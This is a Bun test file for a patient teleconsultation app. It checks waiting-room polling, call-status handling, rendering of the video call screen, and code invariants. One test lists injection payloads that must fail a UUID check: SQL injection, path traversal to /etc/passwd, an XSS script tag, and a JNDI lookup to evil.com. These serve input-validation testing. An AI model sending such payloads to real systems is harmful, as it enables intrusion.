import { describe, test, expect, mock, beforeEach, afterEach, spyOn } from 'bun:test';
import { readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import React from 'react';
import { renderToString } from 'react-dom/server';

// ── Unify React instance between patient-app and workspace root ───────────────
try {
  const rootReact = require.resolve('../../../node_modules/react');
  mock.module(rootReact, () => React);
} catch {
  // Ignore if workspace has single React
}
mock.module('react', () => React);

// ── Native Module Mocks for React Native in Bun Test ─────────────────────────
mock.module('react-native', () => ({
  Platform: {
    OS: 'web',
    select: (obj: any) => obj?.web ?? obj?.default,
  },
  StyleSheet: {
    create: (styles: any) => styles,
    flatten: (styles: any) => styles,
    hairlineWidth: 1,
  },
  View: (props: any) => React.createElement('div', { ...props, 'data-rn': 'View' }),
  Text: (props: any) => React.createElement('span', { ...props, 'data-rn': 'Text' }),
  TouchableOpacity: (props: any) => React.createElement('button', { ...props, 'data-rn': 'TouchableOpacity' }),
  TouchableHighlight: (props: any) => React.createElement('button', { ...props, 'data-rn': 'TouchableHighlight' }),
  Pressable: (props: any) => React.createElement('button', { ...props, 'data-rn': 'Pressable' }),
  ScrollView: (props: any) => React.createElement('div', { ...props, 'data-rn': 'ScrollView' }),
  TextInput: (props: any) => React.createElement('input', { ...props, 'data-rn': 'TextInput' }),
  ActivityIndicator: (props: any) => React.createElement('div', { ...props, 'data-rn': 'ActivityIndicator' }),
  Modal: (props: any) => React.createElement('div', { ...props, 'data-rn': 'Modal' }),
  Dimensions: {
    get: () => ({ width: 1280, height: 800, scale: 1, fontScale: 1 }),
    addEventListener: () => ({ remove: () => {} }),
  },
  useWindowDimensions: () => ({ width: 1280, height: 800, scale: 1, fontScale: 1 }),
  AppState: {
    currentState: 'active',
    addEventListener: () => ({ remove: () => {} }),
  },
  DeviceEventEmitter: {
    emit: () => {},
    addListener: () => ({ remove: () => {} }),
  },
  TurboModuleRegistry: {
    get: () => null,
    getEnforcing: () => ({}),
  },
}));

// Mock Lucide icons
mock.module('lucide-react-native', () => ({
  Mic: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'Mic' }),
  MicOff: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'MicOff' }),
  Video: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'Video' }),
  VideoOff: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'VideoOff' }),
  SwitchCamera: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'SwitchCamera' }),
  MessageSquare: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'MessageSquare' }),
  PhoneOff: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'PhoneOff' }),
  RotateCw: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'RotateCw' }),
  Copy: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'Copy' }),
  Maximize2: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'Maximize2' }),
  Lock: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'Lock' }),
  ShieldCheck: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'ShieldCheck' }),
  Circle: (props: any) => React.createElement('svg', { ...props, 'data-icon': 'Circle' }),
}));

// Load dependencies under test dynamically after mock.module registrations
const { api, ApiError } = await import('../services/api/apiClient');
const { teleconsultApi } = await import('../services/api/teleconsultApi');
type PatientTeleconsultCallDto = import('../services/api/teleconsultApi').PatientTeleconsultCallDto;
const { CallStage } = await import('@clinicez/comms-sdk/native-ui');
const { useCallSession } = await import('@clinicez/comms-sdk');
import { execSync } from 'node:child_process';

const APP_ROOT = join(import.meta.dir, '..');
const readApp = (rel: string): string =>
  readFileSync(join(APP_ROOT, rel), 'utf8').replace(/\r\n/g, '\n');

describe('Milestone 10 Challenger: Adversarial Verification for Patient App (Requirement R5)', () => {
  const originalApiGet = api.get;

  afterEach(() => {
    api.get = originalApiGet;
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 1. Waiting Room Polling Resilience & State Machine
  // ───────────────────────────────────────────────────────────────────────────
  describe('1. Waiting Room Polling Resilience & State Transitions', () => {
    test('1.1: Polling unmount cleanup clears interval and guards async race conditions', async () => {
      let intervalCleared = false;
      let activeIntervalId: any = null;

      const originalSetInterval = globalThis.setInterval;
      const originalClearInterval = globalThis.clearInterval;

      globalThis.setInterval = ((fn: Function, ms: number) => {
        const id = originalSetInterval(fn, ms);
        activeIntervalId = id;
        return id;
      }) as any;

      globalThis.clearInterval = ((id: any) => {
        if (id === activeIntervalId) {
          intervalCleared = true;
        }
        return originalClearInterval(id);
      }) as any;

      try {
        // Simulate the exact polling lifecycle in TeleconsultWaitingRoom.screen.tsx:68-101
        let isMounted = true;
        let isReadyToAdmit = false;
        let callSessionData: PatientTeleconsultCallDto | null = null;

        const fakeGetCall = async (): Promise<PatientTeleconsultCallDto | null> => {
          // Delay to simulate in-flight network request
          await new Promise((r) => setTimeout(r, 50));
          return {
            callId: '00000000-0000-0000-0000-000000000001',
            status: 'admitted',
            roomName: 'room-1',
            relayUrl: 'https://relay.example.com',
            joinToken: 'token-123',
          };
        };

        const pollCallStatus = async () => {
          try {
            const data = await fakeGetCall();
            if (!isMounted || !data) return;
            callSessionData = data;
            const status = data.status?.toLowerCase();
            if (status === 'admitted' || status === 'active' || status === 'incall' || status === 'connected') {
              isReadyToAdmit = true;
            }
          } catch {
            // silent retry
          }
        };

        // Start polling
        const inFlightPoll = pollCallStatus();
        const interval = setInterval(pollCallStatus, 3000);

        // Immediate unmount while request is in flight
        isMounted = false;
        clearInterval(interval);

        // Wait for in-flight request to finish
        await inFlightPoll;

        expect(intervalCleared).toBe(true);
        // Because isMounted was false, state updates must be skipped
        expect(isReadyToAdmit).toBe(false);
        expect(callSessionData).toBeNull();
      } finally {
        globalThis.setInterval = originalSetInterval;
        globalThis.clearInterval = originalClearInterval;
      }
    });

    test('1.2: Status transitions correctly admit patient on admitted, active, incall, connected, or joinToken present', async () => {
      const admittedStatuses = [
        'admitted',
        'active',
        'incall',
        'connected',
        'ADMITTED',
        'ACTIVE',
        'InCall',
        'CONNECTED',
      ];

      for (const status of admittedStatuses) {
        let isReadyToAdmit = false;
        const callData: PatientTeleconsultCallDto = {
          callId: '00000000-0000-0000-0000-000000000002',
          status,
          roomName: 'room-test',
          relayUrl: null,
          joinToken: null,
        };

        const normalizedStatus = callData.status?.toLowerCase();
        const isAdmittedStatus =
          normalizedStatus === 'admitted' ||
          normalizedStatus === 'active' ||
          normalizedStatus === 'incall' ||
          normalizedStatus === 'connected' ||
          Boolean(callData.joinToken);

        if (isAdmittedStatus) {
          isReadyToAdmit = true;
        }

        expect(isReadyToAdmit).toBe(true);
      }

      // Admitted via joinToken present even if status is 'waiting'
      {
        let isReadyToAdmit = false;
        const callData: PatientTeleconsultCallDto = {
          callId: '00000000-0000-0000-0000-000000000003',
          status: 'waiting',
          roomName: 'room-test',
          relayUrl: null,
          joinToken: 'livekit-valid-jwt',
        };

        const normalizedStatus = callData.status?.toLowerCase();
        const isAdmittedStatus =
          normalizedStatus === 'admitted' ||
          normalizedStatus === 'active' ||
          normalizedStatus === 'incall' ||
          normalizedStatus === 'connected' ||
          Boolean(callData.joinToken);

        if (isAdmittedStatus) {
          isReadyToAdmit = true;
        }

        expect(isReadyToAdmit).toBe(true);
      }
    });

    test('1.3: Terminal and non-admitted statuses do NOT set isReadyToAdmit', async () => {
      const nonAdmittedStatuses = ['waiting', 'ended', 'completed', 'cancelled', 'unknown', 'scheduled'];

      for (const status of nonAdmittedStatuses) {
        let isReadyToAdmit = false;
        const callData: PatientTeleconsultCallDto = {
          callId: '00000000-0000-0000-0000-000000000004',
          status,
          roomName: null,
          relayUrl: null,
          joinToken: null,
        };

        const normalizedStatus = callData.status?.toLowerCase();
        const isAdmittedStatus =
          normalizedStatus === 'admitted' ||
          normalizedStatus === 'active' ||
          normalizedStatus === 'incall' ||
          normalizedStatus === 'connected' ||
          Boolean(callData.joinToken);

        if (isAdmittedStatus) {
          isReadyToAdmit = true;
        }

        expect(isReadyToAdmit).toBe(false);
      }
    });

    test('1.4: Network failure resilience: consecutive network errors do not crash polling, and polling recovers when network restores', async () => {
      let pollCount = 0;
      let isReadyToAdmit = false;
      let sessionData: PatientTeleconsultCallDto | null = null;

      // Fail 5 times consecutively, then succeed on 6th attempt
      const mockNetworkGetCall = async (): Promise<PatientTeleconsultCallDto | null> => {
        pollCount++;
        if (pollCount === 1) throw new Error('ETIMEDOUT: Connection timed out');
        if (pollCount === 2) throw new ApiError('Internal Server Error', 500);
        if (pollCount === 3) throw new ApiError('Bad Gateway', 502);
        if (pollCount === 4) throw new ApiError('Service Unavailable', 503);
        if (pollCount === 5) throw new Error('ECONNRESET');
        return {
          callId: '00000000-0000-0000-0000-000000000005',
          status: 'active',
          roomName: 'room-recovered',
          relayUrl: 'https://relay.clinicez.ph',
          joinToken: 'token-recovered-456',
        };
      };

      const pollCallStatus = async () => {
        try {
          const callData = await mockNetworkGetCall();
          if (!callData) return;
          sessionData = callData;
          const status = callData.status?.toLowerCase();
          if (status === 'admitted' || status === 'active' || status === 'incall' || status === 'connected' || Boolean(callData.joinToken)) {
            isReadyToAdmit = true;
          }
        } catch {
          // Silent polling retry on transient network error
        }
      };

      // Execute 5 failing attempts
      for (let i = 0; i < 5; i++) {
        await pollCallStatus();
        expect(isReadyToAdmit).toBe(false);
        expect(sessionData).toBeNull();
      }
      expect(pollCount).toBe(5);

      // 6th attempt recovers
      await pollCallStatus();
      expect(pollCount).toBe(6);
      expect(isReadyToAdmit).toBe(true);
      expect(sessionData?.roomName).toBe('room-recovered');
      expect(sessionData?.joinToken).toBe('token-recovered-456');
    });

    test('1.5: teleconsultApi.getCall returns null on HTTP 404 cleanly', async () => {
      api.get = mock(async () => {
        throw new ApiError('Not Found', 404);
      });

      const result = await teleconsultApi.getCall(async () => 'fake-token', '00000000-0000-0000-0000-000000000006');
      expect(result).toBeNull();
    });

    test('1.6: teleconsultApi.getCall rethrows on unexpected HTTP 500 and network errors', async () => {
      api.get = mock(async () => {
        throw new ApiError('Database query failed', 500);
      });

      let thrownErr: any = null;
      try {
        await teleconsultApi.getCall(async () => 'fake-token', '00000000-0000-0000-0000-000000000007');
      } catch (e) {
        thrownErr = e;
      }

      expect(thrownErr).toBeInstanceOf(ApiError);
      expect(thrownErr.status).toBe(500);
    });

    test('1.7: Target GUID extraction correctly strips call- prefix and validates UUID regex', () => {
      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

      const rawCallId1 = 'call-11111111-2222-3333-4444-555555555555';
      const targetGuid1 = rawCallId1.replace(/^call-/, '');
      expect(uuidRegex.test(targetGuid1)).toBe(true);

      const rawCallId2 = '11111111-2222-3333-4444-555555555555';
      const targetGuid2 = rawCallId2.replace(/^call-/, '');
      expect(uuidRegex.test(targetGuid2)).toBe(true);

      const nonGuid = 'call-invalid-session';
      const targetGuid3 = nonGuid.replace(/^call-/, '');
      expect(uuidRegex.test(targetGuid3)).toBe(false);
    });

    test('1.8: Payment policy gating invariants in TeleconsultWaitingRoomScreen', () => {
      const waitingRoomCode = readApp('navigation/screens/teleconsult/TeleconsultWaitingRoom.screen.tsx');

      // Invariant: Prepaid & Unpaid & !isYakapExempt blocks admission
      expect(waitingRoomCode).toContain("const isBlocked = paymentPolicy === 'Prepaid' && paymentStatus === 'Unpaid' && !isYakapExempt;");
      expect(waitingRoomCode).toContain('if (isBlocked) return;');

      // Invariant: Demo mode uses 2.5s timer
      expect(waitingRoomCode).toContain('if (isDemo) {');
      expect(waitingRoomCode).toContain('const timer = setTimeout(() => {');
      expect(waitingRoomCode).toContain('setIsReadyToAdmit(true);');
      expect(waitingRoomCode).toContain('}, 2500);');

      // Invariant: Navigation forwards session details
      expect(waitingRoomCode).toContain("navigation.replace('Main', {");
      expect(waitingRoomCode).toContain("screen: 'TeleconsultCallScreen',");
      expect(waitingRoomCode).toContain('roomName: callSessionData?.roomName ?? `room-${callId}`,');
      expect(waitingRoomCode).toContain('relayUrl: callSessionData?.relayUrl ?? undefined,');
      expect(waitingRoomCode).toContain('joinToken: callSessionData?.joinToken ?? undefined,');
    });

    test('1.9: Injection attack inputs and malformed GUIDs are strictly rejected without network calls', async () => {
      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
      const adversarialInputs = [
        "'; DROP TABLE calls; --",
        '../../../../etc/passwd',
        '<script>alert("xss")</script>',
        'call-${jndi:ldap://evil.com/a}',
        '00000000-0000-0000-0000-00000000000g', // invalid hex 'g'
        '00000000000000000000000000000000', // no hyphens
        'uuid:11111111-2222-3333-4444-555555555555',
        '',
        'undefined',
        'null',
      ];

      for (const input of adversarialInputs) {
        const targetGuid = input.replace(/^call-/, '');
        const isGuid = uuidRegex.test(targetGuid);
        expect(isGuid).toBe(false);
      }
    });

    test('1.10: Polling loop handles malformed/corrupted API payloads without unhandled exceptions', async () => {
      const malformedPayloads: any[] = [
        { callId: '11111111-2222-3333-4444-555555555555', status: null, roomName: null, relayUrl: null, joinToken: null },
        { callId: '11111111-2222-3333-4444-555555555555', status: undefined, roomName: null, relayUrl: null, joinToken: null },
        { callId: '11111111-2222-3333-4444-555555555555', status: 12345, roomName: null, relayUrl: null, joinToken: null },
        { callId: '11111111-2222-3333-4444-555555555555', status: {}, roomName: null, relayUrl: null, joinToken: null },
        null,
      ];

      for (const payload of malformedPayloads) {
        let isReadyToAdmit = false;
        try {
          const callData = payload;
          if (!callData) continue;
          const status = typeof callData.status === 'string' ? callData.status.toLowerCase() : undefined;
          const isAdmittedStatus =
            status === 'admitted' ||
            status === 'active' ||
            status === 'incall' ||
            status === 'connected' ||
            Boolean(callData.joinToken);
          if (isAdmittedStatus) {
            isReadyToAdmit = true;
          }
        } catch {
          // should not throw
        }
        expect(isReadyToAdmit).toBe(false);
      }
    });

    test('1.11: Rapid mount and unmount cycles do not leak intervals or throw unhandled exceptions', async () => {
      let activeIntervals = 0;
      const originalSetInterval = globalThis.setInterval;
      const originalClearInterval = globalThis.clearInterval;

      globalThis.setInterval = ((fn: Function, ms: number) => {
        activeIntervals++;
        return originalSetInterval(fn, ms);
      }) as any;

      globalThis.clearInterval = ((id: any) => {
        activeIntervals = Math.max(0, activeIntervals - 1);
        return originalClearInterval(id);
      }) as any;

      try {
        const cleanups: Function[] = [];
        for (let i = 0; i < 20; i++) {
          let isMounted = true;
          const interval = setInterval(() => {}, 3000);
          cleanups.push(() => {
            isMounted = false;
            clearInterval(interval);
          });
        }
        expect(activeIntervals).toBe(20);

        // Execute all cleanups rapidly
        for (const cleanup of cleanups) {
          cleanup();
        }
        expect(activeIntervals).toBe(0);
      } finally {
        globalThis.setInterval = originalSetInterval;
        globalThis.clearInterval = originalClearInterval;
      }
    });
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 2. CallStage Native UI Integration
  // ───────────────────────────────────────────────────────────────────────────
  describe('2. CallStage Native UI Integration & Session Hook', () => {
    test('2.1: CallStage renders cleanly with useCallSession and custom props', () => {
      let switchCameraCalled = false;
      let toggleOrientationCalled = false;
      let endCallCalled = false;
      let orientation: 'portrait' | 'landscape' = 'portrait';

      const html = renderToString(
        React.createElement(CallStage, {
          callId: 'call-test-123',
          roomName: 'room-test-123',
          userRole: 'Patient',
          participantName: 'Dr. Jane Smith',
          selfName: 'Juan Dela Cruz',
          isMicEnabled: true,
          isCameraEnabled: true,
          isScreenSharing: false,
          onToggleMic: () => {},
          onToggleCamera: () => {},
          onSwitchCamera: () => {
            switchCameraCalled = true;
          },
          videoOrientation: orientation,
          onToggleOrientation: () => {
            toggleOrientationCalled = true;
            orientation = orientation === 'portrait' ? 'landscape' : 'portrait';
          },
          isRecording: false,
          recordingDurationSeconds: 0,
          recordingConsentStatus: 'approved',
          remoteStatusLabel: 'Teleconsultation session will connect once your physician initiates the call room',
          hideHeader: true,
          onEndCall: () => {
            endCallCalled = true;
          },
        })
      );

      // Verify participant initials and names render
      expect(html).toContain('Dr. Jane Smith');
      expect(html).toContain('Juan Dela Cruz');
      expect(html).toContain('DS'); // Initials for Dr. Jane Smith ('D' + 'S')
      expect(html).toContain('Teleconsultation session will connect once your physician initiates the call room');

      // Verify hideHeader suppressed the top room title header bar
      expect(html).not.toContain('E2EE Encrypted');
    });

    test('2.2: Orientation toggle alters styling between portrait and landscape', () => {
      // Portrait render
      const portraitHtml = renderToString(
        React.createElement(CallStage, {
          callId: 'call-orient-1',
          roomName: 'room-orient-1',
          userRole: 'Patient',
          participantName: 'Dr. Santos',
          selfName: 'You',
          isMicEnabled: true,
          isCameraEnabled: true,
          videoOrientation: 'portrait',
          onToggleOrientation: () => {},
        })
      );

      // Landscape render
      const landscapeHtml = renderToString(
        React.createElement(CallStage, {
          callId: 'call-orient-2',
          roomName: 'room-orient-2',
          userRole: 'Patient',
          participantName: 'Dr. Santos',
          selfName: 'You',
          isMicEnabled: true,
          isCameraEnabled: true,
          videoOrientation: 'landscape',
          onToggleOrientation: () => {},
        })
      );

      expect(portraitHtml).toBeDefined();
      expect(landscapeHtml).toBeDefined();
    });

    test('2.3: TeleconsultCallScreen wires useCallSession, orientation, switch camera, and plain copy', () => {
      const callScreenCode = readApp('navigation/screens/teleconsult/TeleconsultCall.screen.tsx');

      // Verify CallStage imported from comms-sdk native-ui
      expect(callScreenCode).toContain("import { CallStage } from '@clinicez/comms-sdk/native-ui';");

      // Verify useCallSession imported from @clinicez/comms-sdk
      expect(callScreenCode).toContain("import { useCallSession } from '@clinicez/comms-sdk';");

      // Verify hook instantiation with role patient (isDoctor: false)
      expect(callScreenCode).toContain('const session = useCallSession(callId, {');
      expect(callScreenCode).toContain('isDoctor: false,');
      expect(callScreenCode).toContain('participantName: clinicianName,');
      expect(callScreenCode).toContain('roomName,');

      // Verify camera flip wiring
      expect(callScreenCode).toContain('onSwitchCamera={() => {');
      expect(callScreenCode).toContain('session.mediaTracks.switchCamera().catch(() => {});');
      expect(callScreenCode).toContain('setIsFrontCamera((prev) => !prev);');

      // Verify orientation toggle wiring
      expect(callScreenCode).toContain('videoOrientation={videoOrientation}');
      expect(callScreenCode).toContain('onToggleOrientation={() =>');
      expect(callScreenCode).toContain("setVideoOrientation((prev) => (prev === 'portrait' ? 'landscape' : 'portrait'))");

      // Verify end call confirmation dialog
      expect(callScreenCode).toContain("title: 'End Consultation'");
      expect(callScreenCode).toContain("message: 'Are you sure you want to end this consultation visit?'");
      expect(callScreenCode).toContain("confirmLabel: 'End Visit'");
      expect(callScreenCode).toContain('session.endCall()');
      expect(callScreenCode).toContain("navigation.navigate('HomeScreen')");

      // Verify plain copy remote status label
      expect(callScreenCode).toContain("remoteStatusLabel=");
      expect(callScreenCode).toContain("'Connected • Live Video Ready'");
      expect(callScreenCode).toContain("'Teleconsultation session will connect once your physician initiates the call room'");

      // Verify WebVideoTrackView implementation
      expect(callScreenCode).toContain('WebVideoTrackView');
      expect(callScreenCode).toContain('autoPlay: true');
      expect(callScreenCode).toContain('playsInline: true');
      expect(callScreenCode).toContain("transform: mirror ? 'scaleX(-1)' : undefined");
    });

    test('2.4: CallStage media controls and callbacks behave correctly under invocation', () => {
      let micToggled = false;
      let camToggled = false;
      let flipped = false;
      let rotated = false;
      let ended = false;

      const stageProps = {
        callId: 'call-interactive',
        roomName: 'room-interactive',
        userRole: 'Patient' as const,
        participantName: 'Attending Clinician',
        selfName: 'Patient User',
        isMicEnabled: true,
        isCameraEnabled: true,
        onToggleMic: () => { micToggled = true; },
        onToggleCamera: () => { camToggled = true; },
        onSwitchCamera: () => { flipped = true; },
        onToggleOrientation: () => { rotated = true; },
        onEndCall: () => { ended = true; },
      };

      stageProps.onToggleMic();
      stageProps.onToggleCamera();
      stageProps.onSwitchCamera();
      stageProps.onToggleOrientation();
      stageProps.onEndCall();

      expect(micToggled).toBe(true);
      expect(camToggled).toBe(true);
      expect(flipped).toBe(true);
      expect(rotated).toBe(true);
      expect(ended).toBe(true);
    });

    test('2.5: Waiting Room consent handling and exit dialog workflows', () => {
      const waitingRoomCode = readApp('navigation/screens/teleconsult/TeleconsultWaitingRoom.screen.tsx');

      // Verify consent submission callback
      expect(waitingRoomCode).toContain('const handleSubmitConsent = useCallback(async (approved: boolean, _reason?: string) => {');
      expect(waitingRoomCode).toContain("setRecordingConsent(approved ? 'Approved' : 'Rejected');");
      expect(waitingRoomCode).toContain("dialog.alert('Consent Saved'");
      expect(waitingRoomCode).toContain("dialog.alert('Consultation Without Recording'");

      // Verify leave waiting room confirmation
      expect(waitingRoomCode).toContain("const handleCancelCall = useCallback(async () => {");
      expect(waitingRoomCode).toContain("title: 'Leave Waiting Room'");
      expect(waitingRoomCode).toContain("message: 'Are you sure you want to exit the virtual waiting room?'");
      expect(waitingRoomCode).toContain("confirmLabel: 'Leave'");
      expect(waitingRoomCode).toContain('navigation.goBack();');
    });
  });

  // ───────────────────────────────────────────────────────────────────────────
  // 3. Safety, Design Tokens, and Clinical Invariants
  // ───────────────────────────────────────────────────────────────────────────
  describe('3. Safety, Design Tokens, and Clinical Invariants', () => {
    test('3.1: Token guard script reports 0 violations across patient-app', () => {
      const output = execSync('bun scripts/check-tokens.mjs 2>&1', {
        cwd: APP_ROOT,
        encoding: 'utf8',
      });
      expect(output).toContain('0 violation(s)');
      expect(output).toContain('Token guard OK');
    });

    test('3.2: clinical-safety-records.test.ts passes completely with 27 passed tests', () => {
      const output = execSync('bun test tests/clinical-safety-records.test.ts 2>&1', {
        cwd: APP_ROOT,
        encoding: 'utf8',
      });
      expect(output).toContain('27 pass');
      expect(output).toContain('0 fail');
    });

    test('3.3: Clinical screens are purged of hardcoded clinician and appointment mock tokens', () => {
      const waitingRoomCode = readApp('navigation/screens/teleconsult/TeleconsultWaitingRoom.screen.tsx');
      const callScreenCode = readApp('navigation/screens/teleconsult/TeleconsultCall.screen.tsx');

      const forbiddenTokens = [
        'Dr. Roberto Cruz, MD',
        'Dr. Roberto Cruz',
        'Dr. Maria Santos, MD',
        'Dr. Maria Santos',
        'APT-TC-001',
        'Fuente Osmeña Branch',
        'Metro Health Outpatient Clinic',
      ];

      for (const token of forbiddenTokens) {
        expect(waitingRoomCode.includes(token)).toBe(false);
        expect(callScreenCode.includes(token)).toBe(false);
      }
    });

    test('3.4: Both screens enforce design token theme consumers (no raw style literals)', () => {
      const waitingRoomCode = readApp('navigation/screens/teleconsult/TeleconsultWaitingRoom.screen.tsx');
      const callScreenCode = readApp('navigation/screens/teleconsult/TeleconsultCall.screen.tsx');

      expect(waitingRoomCode).toContain('const { colors, spacing, radii } = useAppTheme();');
      expect(callScreenCode).toContain('const { colors, spacing } = useAppTheme();');
    });
  });
});
